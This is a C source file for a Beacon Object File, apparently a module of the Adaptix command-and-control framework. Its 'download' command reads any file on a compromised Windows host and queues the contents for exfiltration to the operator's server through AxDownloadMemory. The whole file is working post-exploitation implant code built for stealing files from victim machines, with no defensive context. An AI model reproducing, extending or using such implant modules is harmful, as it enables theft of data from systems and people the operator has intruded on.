/*
 * download <path> - read a file and hand it to the Adaptix downloads manager.
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"

#define MAX_DOWNLOAD (128 * 1024 * 1024)

void go(char *args, int alen)
{
    datap parser;
    char *path;
    int plen = 0;
    HANDLE file;
    LARGE_INTEGER fsize;
    char *data;
    DWORD read = 0;

    if (!args || alen <= 0) {
        BeaconPrintf(CALLBACK_ERROR, "usage: download <path>\n");
        return;
    }

    BeaconDataParse(&parser, args, alen);
    path = BeaconDataExtract(&parser, &plen);
    if (!path) return;

    file = KERNEL32$CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL,
                                OPEN_EXISTING, 0, NULL);
    if (file == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "CreateFile failed: %lu\n", (unsigned long)KERNEL32$GetLastError());
        return;
    }

    if (!KERNEL32$GetFileSizeEx(file, &fsize) || fsize.QuadPart <= 0 || fsize.QuadPart > MAX_DOWNLOAD) {
        BeaconPrintf(CALLBACK_ERROR, "file is empty or too large\n");
        KERNEL32$CloseHandle(file);
        return;
    }

    data = (char *)KERNEL32$VirtualAlloc(NULL, (SIZE_T)fsize.QuadPart, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!data) {
        KERNEL32$CloseHandle(file);
        return;
    }

    if (!KERNEL32$ReadFile(file, data, (DWORD)fsize.QuadPart, &read, NULL)) {
        BeaconPrintf(CALLBACK_ERROR, "ReadFile failed: %lu\n", (unsigned long)KERNEL32$GetLastError());
        KERNEL32$VirtualFree(data, 0, MEM_RELEASE);
        KERNEL32$CloseHandle(file);
        return;
    }

    AxDownloadMemory(path, data, (int)read);
    BeaconPrintf(CALLBACK_OUTPUT, "Queued download: %s (%lu bytes)\n", path, (unsigned long)read);

    KERNEL32$VirtualFree(data, 0, MEM_RELEASE);
    KERNEL32$CloseHandle(file);
}
